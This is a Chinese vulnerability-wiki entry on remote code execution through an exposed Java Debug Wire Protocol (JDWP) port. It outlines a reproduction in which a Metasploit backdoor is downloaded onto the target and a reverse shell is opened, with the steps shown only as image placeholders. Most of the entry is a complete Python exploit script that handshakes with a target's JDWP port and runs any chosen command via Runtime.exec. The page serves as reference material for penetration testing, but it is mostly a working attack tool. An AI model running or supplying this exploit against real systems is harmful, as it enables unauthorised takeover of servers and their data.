JDWP 远程代码执行漏洞
=====================

一、漏洞简介
------------

　JDWP 是 Java Debug Wire Protocol 的缩写，在JPDA（Java Platform
Debugger Architecture）中，它定义了调试器（debugger）和被调试的 Java
虚拟机（target vm）之间的通信协议。与PHP的 Xdebug
类似，当其调试端口直接开放在公网上时，很容易被攻击者攻击并且获取系统权限。

二、漏洞影响
------------

开启了JDWP服务的主机。

三、复现过程
------------

### 利用dnslog确定可以执行命令：

![1.png](/Users/aresx/Documents/VulWiki/.resource/JDWP远程代码执行漏洞/media/rId25.png)执行结果：![2.png](/Users/aresx/Documents/VulWiki/.resource/JDWP远程代码执行漏洞/media/rId26.png)

### 生成msf后门文件，并将其放入自己的web目录下：

![3.png](/Users/aresx/Documents/VulWiki/.resource/JDWP远程代码执行漏洞/media/rId28.png)

### 执行命令，让目标主机下载后门：

![4.png](/Users/aresx/Documents/VulWiki/.resource/JDWP远程代码执行漏洞/media/rId30.png)

### 设置msf,让其处于监听状态：

![5.png](/Users/aresx/Documents/VulWiki/.resource/JDWP远程代码执行漏洞/media/rId32.png)![6.png](/Users/aresx/Documents/VulWiki/.resource/JDWP远程代码执行漏洞/media/rId33.png)![7.png](/Users/aresx/Documents/VulWiki/.resource/JDWP远程代码执行漏洞/media/rId34.png)

### 给予后门可执行的权限，并执行后门：

![8.png](/Users/aresx/Documents/VulWiki/.resource/JDWP远程代码执行漏洞/media/rId36.png)![9.png](/Users/aresx/Documents/VulWiki/.resource/JDWP远程代码执行漏洞/media/rId37.png)

### 查看msf反弹shell情况：

![10.png](/Users/aresx/Documents/VulWiki/.resource/JDWP远程代码执行漏洞/media/rId39.png)

### 这个时候session已经成功创建，但是没办法正常出现meterpreter终端。这个时候需要ctrl+c，然后用sessions 1来使用创建的session。

![11.png](/Users/aresx/Documents/VulWiki/.resource/JDWP远程代码执行漏洞/media/rId41.png)

### ps

    　　1、不要直接反弹shell，弹不过来的。
    　　2、在使用Msf生成后门反弹的时候，往往会卡在"session 1 opend"，这个时候使用ctrl + c强制退出，然后使用session 1，选择session即可解决。
    　　3、JDWP的端口是随机选择的，所以在探测的时候要选择全端口。具体判断的时候nmap可以判断出来，
    Java Debug Wire Protocol (Reference Imp lementation)version 1.8 1.8.0 181，这个是我遇到的那个服务版本。

### poc

    import socket
    import time
    import sys
    import struct
    import urllib
    import argparse



    ################################################################################
    #
    # JDWP protocol variables
    #
    HANDSHAKE                 = "JDWP-Handshake"

    REQUEST_PACKET_TYPE       = 0x00
    REPLY_PACKET_TYPE         = 0x80

    # Command signatures
    VERSION_SIG               = (1, 1)
    CLASSESBYSIGNATURE_SIG    = (1, 2)
    ALLCLASSES_SIG            = (1, 3)
    ALLTHREADS_SIG            = (1, 4)
    IDSIZES_SIG               = (1, 7)
    CREATESTRING_SIG          = (1, 11)
    SUSPENDVM_SIG             = (1, 8)
    RESUMEVM_SIG              = (1, 9)
    SIGNATURE_SIG             = (2, 1)
    FIELDS_SIG                = (2, 4)
    METHODS_SIG               = (2, 5)
    GETVALUES_SIG             = (2, 6)
    CLASSOBJECT_SIG           = (2, 11)
    INVOKESTATICMETHOD_SIG    = (3, 3)
    REFERENCETYPE_SIG         = (9, 1)
    INVOKEMETHOD_SIG          = (9, 6)
    STRINGVALUE_SIG           = (10, 1)
    THREADNAME_SIG            = (11, 1)
    THREADSUSPEND_SIG         = (11, 2)
    THREADRESUME_SIG          = (11, 3)
    THREADSTATUS_SIG          = (11, 4)
    EVENTSET_SIG              = (15, 1)
    EVENTCLEAR_SIG            = (15, 2)
    EVENTCLEARALL_SIG         = (15, 3)

    # Other codes
    MODKIND_COUNT             = 1
    MODKIND_THREADONLY        = 2
    MODKIND_CLASSMATCH        = 5
    MODKIND_LOCATIONONLY      = 7
    EVENT_BREAKPOINT          = 2
    SUSPEND_EVENTTHREAD       = 1
    SUSPEND_ALL               = 2
    NOT_IMPLEMENTED           = 99
    VM_DEAD                   = 112
    INVOKE_SINGLE_THREADED    = 2
    TAG_OBJECT                = 76
    TAG_STRING                = 115
    TYPE_CLASS                = 1
    MODKIND_STEP              = 10 
    EVENTKIND_STEP            = 1
    STEP_MIN                  = 0
    STEP_INTO                 = 0

    ################################################################################
    #
    # JDWP client class
    #
    class JDWPClient:

        def __init__(self, host, port=8000):
            self.host = host
            self.port = port
            self.methods = {}
            self.fields = {}
            self.id = 0x01
            return

        def create_packet(self, cmdsig, data=""):
            flags = 0x00
            cmdset, cmd = cmdsig
            pktlen = len(data) + 11
            pkt = struct.pack(">IIccc", pktlen, self.id, chr(flags), chr(cmdset), chr(cmd))
            pkt+= data
            self.id += 2
            return pkt

        def read_reply(self):
            header = self.socket.recv(11)
            pktlen, id, flags, errcode = struct.unpack(">IIcH", header)

            if flags == chr(REPLY_PACKET_TYPE):
                if errcode :
                    raise Exception("Received errcode %d" % errcode)

            buf = ""
            while len(buf) + 11 < pktlen:
                data = self.socket.recv(1024)
                if len(data):
                    buf += data
                else:
                    time.sleep(1)
            return buf

        def parse_entries(self, buf, formats, explicit=True):
            entries = []
            index = 0


            if explicit:
                nb_entries = struct.unpack(">I", buf[:4])[0]
                buf = buf[4:]
            else:
                nb_entries = 1

            for i in range(nb_entries):
                data = {}
                for fmt, name in formats:
                    if fmt == "L" or fmt == 8:
                        data[name] = int(struct.unpack(">Q",buf[index:index+8]) [0])
                        index += 8
                    elif fmt == "I" or fmt == 4:
                        data[name] = int(struct.unpack(">I", buf[index:index+4])[0])
                        index += 4
                    elif fmt == 'S':
                        l = struct.unpack(">I", buf[index:index+4])[0]
                        data[name] = buf[index+4:index+4+l]
                        index += 4+l
                    elif fmt == 'C':
                        data[name] = ord(struct.unpack(">c", buf[index])[0])
                        index += 1
                    elif fmt == 'Z':
                        t = ord(struct.unpack(">c", buf[index])[0])
                        if t == 115:
                            s = self.solve_string(buf[index+1:index+9])
                            data[name] = s
                            index+=9
                        elif t == 73:
                            data[name] = struct.unpack(">I", buf[index+1:index+5])[0]
                            buf = struct.unpack(">I", buf[index+5:index+9])
                            index=0

                    else:
                        print "Error"
                        sys.exit(1)

                entries.append( data )

            return entries

        def format(self, fmt, value):
            if fmt == "L" or fmt == 8:
                return struct.pack(">Q", value)
            elif fmt == "I" or fmt == 4:
                return struct.pack(">I", value)

            raise Exception("Unknown format")

        def unformat(self, fmt, value):
            if fmt == "L" or fmt == 8:
                return struct.unpack(">Q", value[:8])[0]
            elif fmt == "I" or fmt == 4:
                return struct.unpack(">I", value[:4])[0]
            else:
                raise Exception("Unknown format")
            return

        def start(self):
            self.handshake(self.host, self.port)
            self.idsizes()
            self.getversion()
            self.allclasses()
            return

        def handshake(self, host, port):
            s = socket.socket()
            try:
                s.connect( (host, port) )
            except socket.error as msg:
                raise Exception("Failed to connect: %s" % msg)

            s.send( HANDSHAKE )

            if s.recv( len(HANDSHAKE) ) != HANDSHAKE:
                raise Exception("Failed to handshake")
            else:
                self.socket = s

            return

        def leave(self):
            self.socket.close()
            return

        def getversion(self):
            self.socket.sendall( self.create_packet(VERSION_SIG) )
            buf = self.read_reply()
            formats = [ ('S', "description"), ('I', "jdwpMajor"), ('I', "jdwpMinor"),
                        ('S', "vmVersion"), ('S', "vmName"), ]
            for entry in self.parse_entries(buf, formats, False):
                for name,value  in entry.iteritems():
                    setattr(self, name, value)
            return

        @property
        def version(self):
            return "%s - %s" % (self.vmName, self.vmVersion)

        def idsizes(self):
            self.socket.sendall( self.create_packet(IDSIZES_SIG) )
            buf = self.read_reply()
            formats = [ ("I", "fieldIDSize"), ("I", "methodIDSize"), ("I", "objectIDSize"),
                        ("I", "referenceTypeIDSize"), ("I", "frameIDSize") ]
            for entry in self.parse_entries(buf, formats, False):
                for name,value  in entry.iteritems():
                    setattr(self, name, value)
            return

        def allthreads(self):
            try:
                getattr(self, "threads")
            except :
                self.socket.sendall( self.create_packet(ALLTHREADS_SIG) )
                buf = self.read_reply()
                formats = [ (self.objectIDSize, "threadId")]
                self.threads = self.parse_entries(buf, formats)
            finally:
                return self.threads

        def get_thread_by_name(self, name):
            self.allthreads()
            for t in self.threads:
                threadId = self.format(self.objectIDSize, t["threadId"])
                self.socket.sendall( self.create_packet(THREADNAME_SIG, data=threadId) )
                buf = self.read_reply()
                if len(buf) and name == self.readstring(buf):
                    return t
            return None

        def get_name_by_threadId(self, threadId):
            threadId = self.format(self.objectIDSize, threadId)
            self.socket.sendall( self.create_packet(THREADNAME_SIG, data=threadId) )
            buf = self.read_reply()
            formats = [ ('S', "name") ]
            buf = self.parse_entries(buf, formats, False)
            return buf[0]['name']
        
        def allclasses(self):
            try:
                getattr(self, "classes")
            except:
                self.socket.sendall( self.create_packet(ALLCLASSES_SIG) )
                buf = self.read_reply()
                formats = [ ('C', "refTypeTag"),
                            (self.referenceTypeIDSize, "refTypeId"),
                            ('S', "signature"),
                            ('I', "status")]
                self.classes = self.parse_entries(buf, formats)

            return self.classes

        def get_class_by_name(self, name):
            for entry in self.classes:
                if entry["signature"].lower() == name.lower() :
                    return entry
            return None

        def get_methods(self, refTypeId):
            if not self.methods.has_key(refTypeId):
                refId = self.format(self.referenceTypeIDSize, refTypeId)
                self.socket.sendall( self.create_packet(METHODS_SIG, data=refId) )
                buf = self.read_reply()
                formats = [ (self.methodIDSize, "methodId"),
                            ('S', "name"),
                            ('S', "signature"),
                            ('I', "modBits")]
                self.methods[refTypeId] = self.parse_entries(buf, formats)
            return self.methods[refTypeId]

        def get_method_by_name(self, name):
            for refId in self.methods.keys():
                for entry in self.methods[refId]:
                    if entry["name"].lower() == name.lower() :
                        return entry
            return None

        def getfields(self, refTypeId):
            if not self.fields.has_key( refTypeId ):
                refId = self.format(self.referenceTypeIDSize, refTypeId)
                self.socket.sendall( self.create_packet(FIELDS_SIG, data=refId) )
                buf = self.read_reply()
                formats = [ (self.fieldIDSize, "fieldId"),
                            ('S', "name"),
                            ('S', "signature"),
                            ('I', "modbits")]
                self.fields[refTypeId] = self.parse_entries(buf, formats)
            return self.fields[refTypeId]

        def getvalue(self, refTypeId, fieldId):
            data = self.format(self.referenceTypeIDSize, refTypeId)
            data+= struct.pack(">I", 1)
            data+= self.format(self.fieldIDSize, fieldId)
            self.socket.sendall( self.create_packet(GETVALUES_SIG, data=data) )
            buf = self.read_reply()
            formats = [ ("Z", "value") ]
            field = self.parse_entries(buf, formats)[0]
            return field

        def createstring(self, data):
            buf = self.buildstring(data)
            self.socket.sendall( self.create_packet(CREATESTRING_SIG, data=buf) )
            buf = self.read_reply()
            return self.parse_entries(buf, [(self.objectIDSize, "objId")], False)

        def buildstring(self, data):
            return struct.pack(">I", len(data)) + data

        def readstring(self, data):
            size = struct.unpack(">I", data[:4])[0]
            return data[4:4+size]

        def suspendvm(self):
            self.socket.sendall( self.create_packet( SUSPENDVM_SIG ) )
            self.read_reply()
            return

        def resumevm(self):
            self.socket.sendall( self.create_packet( RESUMEVM_SIG ) )
            self.read_reply()
            return

        def invokestatic(self, classId, threadId, methId, *args):
            data = self.format(self.referenceTypeIDSize, classId)
            data+= self.format(self.objectIDSize, threadId)
            data+= self.format(self.methodIDSize, methId)
            data+= struct.pack(">I", len(args))
            for arg in args:
                data+= arg
            data+= struct.pack(">I", 0)

            self.socket.sendall( self.create_packet(INVOKESTATICMETHOD_SIG, data=data) )
            buf = self.read_reply()
            return buf

        def invoke(self, objId, threadId, classId, methId, *args):
            data = self.format(self.objectIDSize, objId)
            data+= self.format(self.objectIDSize, threadId)
            data+= self.format(self.referenceTypeIDSize, classId)
            data+= self.format(self.methodIDSize, methId)
            data+= struct.pack(">I", len(args))
            for arg in args:
                data+= arg
            data+= struct.pack(">I", 0)

            self.socket.sendall( self.create_packet(INVOKEMETHOD_SIG, data=data) )
            buf = self.read_reply()
            return buf

        def solve_string(self, objId):
            self.socket.sendall( self.create_packet(STRINGVALUE_SIG, data=objId) )
            buf = self.read_reply()
            if len(buf):
                return self.readstring(buf)
            else:
                return ""

        def query_thread(self, threadId, kind):
            data = self.format(self.objectIDSize, threadId)
            self.socket.sendall( self.create_packet(kind, data=data) )
            buf = self.read_reply()
            return buf

        def suspend_thread(self, threadId):
            return self.query_thread(threadId, THREADSUSPEND_SIG)

        def status_thread(self, threadId):
            buf = self.query_thread(threadId, THREADSTATUS_SIG)
            formats = [ ('I', "threadStatus"),
                       ('I','suspendStatus')]
            threadStatus = cli.parse_entries(buf, formats, False)
            return threadStatus

        def resume_thread(self, threadId):
            return self.query_thread(threadId, THREADRESUME_SIG)

        def send_event(self, eventCode, *args):
            data = ""
            data+= chr( eventCode )
            data+= chr( SUSPEND_ALL )
            data+= struct.pack(">I", len(args))

            for kind, option in args:
                data+= chr( kind )
                data+= option

            self.socket.sendall( self.create_packet(EVENTSET_SIG, data=data) )
            buf = self.read_reply()
            return struct.unpack(">I", buf)[0]

        def clear_event(self, eventCode, rId):
            data = chr(eventCode)
            data+= struct.pack(">I", rId)
            self.socket.sendall( self.create_packet(EVENTCLEAR_SIG, data=data) )
            self.read_reply()
            return

        def clear_events(self):
            self.socket.sendall( self.create_packet(EVENTCLEARALL_SIG) )
            self.read_reply()
            return

        def wait_for_event(self):
            buf = self.read_reply()
            return buf

        def parse_event(self, buf, eventId):
            num = struct.unpack(">I", buf[2:6])[0]
            rId = struct.unpack(">I", buf[6:10])[0]
            if rId != eventId:
                return None
            tId = self.unformat(self.objectIDSize, buf[10:10+self.objectIDSize])
            loc = -1 # don't care
            return rId, tId, loc

        
    def runtime_exec(jdwp):

        # 1. get Runtime class reference
        runtimeClass = jdwp.get_class_by_name("Ljava/lang/Runtime;")
        if runtimeClass is None:
            print ("[-] Cannot find class Runtime")
            return False
        print ("[+] Found Runtime class: id=%x" % runtimeClass["refTypeId"])

        # 2. get getRuntime() meth reference
        jdwp.get_methods(runtimeClass["refTypeId"])
        getRuntimeMeth = jdwp.get_method_by_name("getRuntime")
        if getRuntimeMeth is None:
            print ("[-] Cannot find method Runtime.getRuntime()")
            return False
        print ("[+] Found Runtime.getRuntime(): id=%x" % getRuntimeMeth["methodId"])

        # 3. setup 'step into' event
        threads = jdwp.allthreads()
        for thread in threads:
            threadStatus = jdwp.status_thread(thread['threadId'])
            threadStatus = threadStatus[0]["threadStatus"]
            if threadStatus == 2: #Sleeping
                threadId = thread['threadId']
                break
        if "threadId" not in dir():
            print("Could not find a suitable thread for stepping")
            exit()
        
        print("[+] Setting 'step into' event in thread: %s" % threadId)
        jdwp.suspendvm()
        step_info  = jdwp.format(jdwp.objectIDSize, threadId)
        step_info += struct.pack(">I",STEP_MIN)
        step_info += struct.pack(">I",STEP_INTO)
        data       = [ (MODKIND_STEP, step_info), ]
        
        rId = jdwp.send_event(EVENTKIND_STEP, *data)

        # 4. resume vm and wait for event
        jdwp.resumevm()

        while True:
            buf = jdwp.wait_for_event()
            ret = jdwp.parse_event(buf, rId)
            if ret is not None:
                break

        rId, tId, loc = ret
        print ("[+] Received matching event from thread %#x" % tId)

        jdwp.clear_event(EVENTKIND_STEP, rId)

        # 5. Now we can execute any code
        runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd)


        jdwp.resumevm()

        print ("[!] Command successfully executed")

        return True

    def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, command):
        #
        # This function will invoke command as a payload, which will be running
        # with JVM privilege on host (intrusive).
        #
        print ("[+] Selected payload '%s'" % command)

        # 1. allocating string containing our command to exec()
        cmdObjIds = jdwp.createstring( command )
        if len(cmdObjIds) == 0:
            print ("[-] Failed to allocate command")
            return False
        cmdObjId = cmdObjIds[0]["objId"]
        print ("[+] Command string object created id:%x" % cmdObjId)

        # 2. use context to get Runtime object
        buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
        if buf[0] != chr(TAG_OBJECT):
            print ("[-] Unexpected returned type: expecting Object")
            return False
        rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])

        if rt is None:
            print "[-] Failed to invoke Runtime.getRuntime()"
            return False
        print ("[+] Runtime.getRuntime() returned context id:%#x" % rt)

        # 3. find exec() method
        execMeth = jdwp.get_method_by_name("exec")
        if execMeth is None:
            print ("[-] Cannot find method Runtime.exec()")
            return False
        print ("[+] found Runtime.exec(): id=%x" % execMeth["methodId"])

        # 4. call exec() in this context with the alloc-ed string
        data = [ chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmdObjId) ]
        buf = jdwp.invoke(rt, threadId, runtimeClassId, execMeth["methodId"], *data)
        if buf[0] != chr(TAG_OBJECT):
            print ("[-] Unexpected returned type: expecting Object")
            return False

        retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
        print ("[+] Runtime.exec() successful, retId=%x" % retId)

        return True

    if __name__ == "__main__":
        parser = argparse.ArgumentParser(description="Universal exploitation script for JDWP by @Lz1y, base on @_hugsy_",
                                         formatter_class=argparse.ArgumentDefaultsHelpFormatter )

        parser.add_argument("-t", "--target", type=str, metavar="IP", help="Remote target IP", required=True)
        parser.add_argument("-p", "--port", type=int, metavar="PORT", default=8000, help="Remote target port")

        parser.add_argument("-c", "--cmd", dest="cmd", type=str, metavar="COMMAND",
                            help="Specify command to execute remotely")

        args = parser.parse_args()
        
        cli = JDWPClient(args.target, args.port)
        try:
            cli.start()
        except:
            print("Handshake failed!")

        #print vm description
        print "[+] Dump vm description \n", cli.description, "\n"
        runtime_exec(cli)
        cli.leave()

参考链接
--------

> https://www.cnblogs.com/sq-smile/protected/p/13172831.html
>
> https://github.com/Lz1y/jdwp-shellifier
